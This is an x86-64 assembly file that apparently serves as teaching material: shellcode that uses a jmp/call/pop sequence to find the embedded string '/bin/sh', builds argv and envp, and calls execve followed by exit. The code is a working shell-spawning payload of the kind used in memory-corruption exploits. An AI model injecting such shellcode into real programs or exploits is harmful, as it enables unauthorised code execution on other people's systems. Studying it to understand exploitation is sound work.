#include <sys/syscall.h>

#define STRING  "/bin/sh"
#define STRLEN  7
#define ARGV    (STRLEN+1)
#define ENVP    (ARGV+8)

.globl main
        .type   main, @function

 main:
        jmp     calladdr

 popladdr:
        popq    %rcx
        movq    %rcx,(ARGV)(%rcx)       /* set up argv pointer to pathname */
        xorq    %rax,%rax               /* get a 64-bit zero value */
        movb    %al,(STRLEN)(%rcx)      /* null-terminate our string */
        movq    %rax,(ENVP)(%rcx)       /* set up null envp */

        movb    $SYS_execve,%al         /* syscall arg 1: syscall number */
        movq    %rcx,%rdi               /* syscall arg 2: string pathname */
        leaq    ARGV(%rcx),%rsi         /* syscall arg 2: argv */
        leaq    ENVP(%rcx),%rdx         /* syscall arg 3: envp */
        syscall                 /* invoke syscall */

        movb    $SYS_exit,%al          /* syscall arg 1: SYS_exit (60) */
        xorq    %rdi,%rdi               /* syscall arg 2: 0 */
        syscall                 /* invoke syscall */

 calladdr:
        call    popladdr
        .ascii  STRING